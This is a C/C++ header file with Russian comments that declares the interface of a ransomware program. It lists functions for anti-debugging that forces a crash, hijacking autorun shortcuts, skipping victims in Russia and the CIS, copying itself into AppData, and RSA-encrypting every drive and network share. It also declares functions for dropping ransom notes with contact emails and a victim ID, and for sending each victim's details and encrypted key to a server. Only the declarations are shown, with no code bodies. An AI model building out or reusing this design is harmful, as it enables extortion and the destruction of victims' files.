#pragma once
#include "../Api.h"
#include "../Utils.h"
#include "browser.h"
#include <WinSock.h>
#include <Shlobj.h>
#include <SoftPub.h>


extern Build_Data* data;
extern int filesInfected;
extern CRITICAL_SECTION cs;

typedef struct
{
	HCRYPTPROV prov;
	HCRYPTKEY key;
	char path[512];
}CRYPT_INFO;

typedef void(*T_sendFunction)(LPSTR startTime, LPSTR endTime, LPSTR key);


/*
	Функция tls-коллбека. Она будет вызвана перед main. По дефолту в некоторых отладчиках Entry Point = main,
	поэтому недалёкого реверсера будет очень легко остановить даже этим, т.к. tls-коллбек выбъет бсод до того, как человек начнёт отлаживать.
	Тут будут только проверки на отладчик.
*/
void NTAPI main_tls(PVOID DllHandle, DWORD Reason, PVOID Reserved);
/*
	Ищет ярлыки в папке автозагрузки и меняет любой из них на себя. Возвращает true в таком случае.
	Если не нашёл - добавит свой и вернёт false.
	forceName - имя, которое будет использовано если ярлык не был найден (без расширения).
	description - описание для ярлыка.
*/
bool AddAutoRun(LPSTR forceName, LPSTR description);
// Проверка: находится ли пк в ру или снг. Чекает язык в системе, раскладку клавы и страну по айпи через 2ip.
bool CheckCountry();
/*
	Если процесс запущен не из appdata, то копируется в appdata и возвращает путь скопированного файла, иначе - NULL.
	new_name = название, с которым будет копироваться.
*/
LPSTR CopyToAppData(LPSTR new_name);
/*
	Проходит по всем директориям на заданном диске и шифрует файлы.
	cryptInfo - структура с ключом, контейнером и путём итерации.
*/
void EncryptDisk(CRYPT_INFO* cryptInfo);
/* 
	Шифрует файл. НЕ разделяет данные критической секций - причина внутри.
	infile - путь к файлу
	provider - контейнер cryptoapi
	key - юзер рса ключ
*/
void FileEncrypt(char *infile, HCRYPTPROV provider, HCRYPTKEY rsa_key);
// Показывает html-окно с запиской. Записка сжата алгоритмом lznt1 (уменьшает её вес в 2 раза).
void ShowNode();
/*
	Отправляет информацию о жертве на сервер. Всё время в формате SQL (год-мес-день час:мин:сек)
	startTime - время начала шифрования
	endTime - время конца шифрования
	key - зашифрованный ключ в base64
*/
void sendInfo_WinInet(LPSTR startTime, LPSTR endTime, LPSTR key);
// То же, что и sendInfo_WinInet
void sendInfo_socket(LPSTR startTime, LPSTR endTime, LPSTR key);
// Дропает паблик ключ юзеру в папку с документами, сохраняет глобальный буфер для отправки на сервер.
void dropKey(HCRYPTPROV prov, HCRYPTKEY rsa_key);
// Проверяет наличие ключа в документах.
bool checkKey();
// Читает ключ из документов в буфер.
LPSTR readKey();
/*
	Скидывает записку на раб.стол и в документы
	mail1 - Первая почта
	mail2 - Вторая почта
	victimId - GUID жертвы
*/
void dropNode(char *mail1, char *mail2, char *victimId);

// Возвращает массив путей к сетевым папкам в системе. Работает через netapi32.dll (NetShareEnum)
LPSTR* GetNetwork();
/* 
	Проверяет, является ли директория директорией браузера. Проверяет браузеры: opera, mozilla firefox, google chrome, internet explorer.
	directory - директория, обязательно слеш в конце (C:\Users\), без него работать не будет.
*/
bool IsBrowser(LPSTR directory);
/* 
	Проверяет наличие цифровой подписи у файла. 
	filePath = путь к файлу, в стеке или куче - значения не имеет. Не изменяется функцией.
*/
bool checkSignature(LPSTR filePath);
/* 
	Проверяет, запущен ли другой процесс шифровальщика.
	processName = имя процесса, который будет проверяться.
*/
bool checkActive(char *processName);